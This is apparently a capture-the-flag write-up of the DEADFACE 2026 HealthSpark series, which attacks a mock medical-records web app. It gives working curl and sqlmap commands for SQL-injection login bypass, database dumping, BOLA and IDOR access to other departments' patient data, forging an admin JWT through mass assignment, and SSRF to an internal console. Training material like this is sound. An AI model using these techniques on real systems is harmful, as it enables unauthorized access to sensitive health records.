# HEALTHSPARK SERIE - DEADFACE

**four challenges serie taking place in the 2026 deadface ctf.**
these challenges are taking place on a web app managing medical patients informations (Health Spark). The app is a Node js/Express with JWT (HS256), and SQLite database, and an API REST documented by swagger

**The target's IP :** `http://<TARGET>:3000`

## First Challenge, Login Bypass (SQL injection)

**Objective** : logging in 

### Recon

we start, like often when portscan is said not to be useful, by reading the source code of the page.
we can see that the login page sends a POST request to an /api/login at every login attempt.
reading the headers and body we gather important informations: 
**in the body a JSON syntax sends " username: '' " and " password: '' "**

### Exploitation

first things first, I try an sqli in this post query, and... it works:

in the username field 
```  ' OR 1=1 --  
```
gives us as a response the creds and the first flag, so the entire payload was : 

```bash
curl -s -X POST 'http://<TARGET>:3000/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"'\'' OR 1=1-- -","password":"x"}'
```

which contains the target's IP, followed by the recently discovered API login endpoint,
as a Header only the content type and in the body the sqli payload in the username field as JSON format

**creds :** username: **john.smith**, (department 10685), password `Locked_In_And_Ready`.
**Flag :** `deadface{typical_and_classic}`


## Second Challenge, Patient Records Dump (BOLA + time based SQLI)

**Objective** : Accessing patient records that do not belong to our department

### Recon

Once logged in we once again go on a recon, trying to gather most infos possible
we notice we have access to a JWT token which allows us to explore infos on the different API endpoints
we try multiple ways to harvest these until the url `/api-docs/swagger-ui-init.js` answers the http code 200.
so we now know all the api endpoints which contains :
- `/api/patients` (also visible in the page source) accepts a department id in the body of a POST query and returns the list of all patients in this department.
- `/api/department_id` which lists existing departments

the endpoint /api/patients contains a BOLA (Broken Object Level Authorization):
it trust the department_id that's sent in the http request's body without verifying that the authenticated user really belongs to this department


### Exploitation

** Step 1 :** Dump users list via sqlmap

the login endpoint is also vulnerable to blind time-based SQL injection:

```bash
sqlmap -u "http://<TARGET>:3000/api/login" \
  --data='{"username":"test","password":"test"}' \
  --content-type="application/json" \
  --level=3 --risk=2 \
  --ignore-code=401 \
  --dbms=SQLite \
  --dump
```

this payload dumps the users table in the database with the 4 credentials of another department than the one we're actually logged in (department_id 18432):
- maria.holloway / eybrGv3YmNCxaDVSBsmZ
- devon.pearce / QJRFffAHyuRw5uTLbbGt  
- aisha.nakamura / WcQARjTJN4R7ni3808X4
- grant.whitfield / 8biAod575okZV4P4rNIm

what we really care about here is not the credentials themselves but the `department_id 18432` they reveal : it proves that another department exists and gives us a valid id to target. that's exactly what the BOLA needs, since we don't need to log in as those users, we just reuse our own john.smith token and point it at their department.

** Step 2 :** BOLA on /api/patients

```bash
curl -s -X POST 'http://<TARGET>:3000/api/patients' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $T" \
  -d '{"departmentid":"18432"}'
```

due to the BOLA vulnerability the server answers us the patients list in the 18432 department although john.smith (the user we're logged as) is in the 10685.
among these patients one has the email : "records.exposed@example.com" (remember that for later) and as name patient 0, with in the patient info **the flag** : 


**Flag :** `deadface{hipaa_exposure_is_bad}`

## Challenge 3, IDOR

**Objective :** download documents we're not supposed to have access to

### Recon

I omitted that in the swagger api-docs file, we found an endpoint : `/file_document`

it also tells us:
- "Download a member document (PDF)"
- "record PDF for the document id in the query string"
- The `id` uses query string : `/file_document?id=...`

### Hard Time...

the api and the page source dont mention any document id,
after several tries I tried the member id as the document id and this worked.

### Exploitation

```bash
curl -s -i -X POST 'http://<TARGET>:3000/file_document?id=8820343' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $T" \
  -d '{"departmentid":"18432"}'
```

this payload uses the token (stored in the bash variable T), the other department's id, and the document id of the user mentioned earlier **patient zero**
because if you remember, there was a hint for this challenge, in the patient's email records.exposed@example.com

this payload returns a pdf file containing the flag in clear.

**Flag :** `deadface{someone_should_report_this}`


## Challenge 4, Internal Admin Console (Mass Assignment + SSRF)

**Objective**: Get an Admin Access on a publicly visible but blocked console

### Recon

The Swagger documents another endpoint I’ve omitted : `/api/profile` (POST) which allows us to update our profile. 
Decoding our JWT (base64) reveals the token’s claims, including a `role` field. Testing for mass assignment by adding `"role":"admin"` to the profile update body,
the server signs a new JWT with admin privileges — confirming it blindly copies all body parameters into the new token’s claims without filtering sensitive fields like `role`.

Once we have an admin token, we need to find the internal admin console. The Swagger mentions an `/api/admin/fetch-photo` endpoint that takes a URL parameter — a classic SSRF surface. We bruteforced common ports (80, 443, 3000, 5000, 8000, 8080, 8443, 9090) via this endpoint targeting `127.0.0.1`, and port **8080** returned a valid response containing the admin console.

### Exploitation

```bash
curl -s -X POST 'http://<TARGET>:3000/api/profile' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $T" \
  -d '{"role":"admin","sub":"john.smith","departmentid":10685}'
```

so according to the recon, this payload forges the admin token which we will stock in a ADMIN_T variable:

```bash
ADMIN_T="forged admin token"
```

Then

```bash
curl -s -X POST 'http://<TARGET>:3000/api/admin/fetch-photo' \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_T" \
  -d '{"url":"http://127.0.0.1:8080"}'
```
 
this payload uses the admin token harvested while updating our profile with the profile api endpoint
The servers fetch the internal URL of the admin console and returns an admin console token **AND**... **The final Flag**

**Flag :** `deadface{oh_you_shouldnt_be_here}`

## attack chain summary
 
```
Login SQLi (' OR 1=1-- -)
  → JWT john.smith (dept 10685)
    → BOLA /api/patients with dept 18432
      → memberId of Patient Zero (HS-8820343)
        → IDOR /file_document?id=8820343 → PDF + flag ch.3
    → Mass Assignment /api/profile → token admin forged
      → SSRF /api/admin/fetch-photo → localhost:8080
        → Internal console → flag ch.4
```
 
**Exploited Vulnerabilities :**
1. SQL Injection (authentication bypass)
2. BOLA / Broken Object Level Authorization (cross-department access)
3. IDOR / Insecure Direct Object Reference (arbitrary document download)
4. Mass Assignment (privilege escalation via JWT)
5. SSRF (Server-Side Request Forgery toward internal service)
